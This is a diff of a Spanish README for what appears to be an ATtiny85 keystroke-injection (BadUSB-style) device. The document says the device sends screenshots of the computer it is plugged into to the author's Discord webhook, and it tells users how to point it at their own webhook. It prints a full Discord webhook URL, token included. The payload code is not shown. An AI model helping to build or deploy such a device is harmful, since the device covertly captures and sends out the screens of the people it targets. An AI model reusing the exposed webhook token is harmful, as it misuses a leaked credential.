@@ -1,5 +1,5 @@
 Este codigo solo funciona si el teclado del ordenador esta en ingles, si esta en otro idioma como el español este no funcionara.
-El codigo que debes de subir al attiny esta en el archivo llamado Attiny85, instalas todos los drivers del attiny85 y despues usas arduinoIDE, solo copias y pegas.
+El codigo que debes de subir al attiny esta en el archivo llamado codigo1.txt, debes instalar primero todos los drivers del attiny85 y despues usas arduinoIDE, solo copias y pegas el codigo dentro del txt.
 
 Este codigo esta hecha para mandar capturas a mi webhook de discord, para cambiar la direccion y que se mande al de tu gusto cambiar lo siguente
 $webhook = 'https://discord.com/api/webhooks/1473072881024892998/XWwbEQwmsG5Kndc2Kfl_U_3xkb8H2z3d9r6SPSlHHlmoLQ6sEAG3sq7pTniLtLf9XiM8'
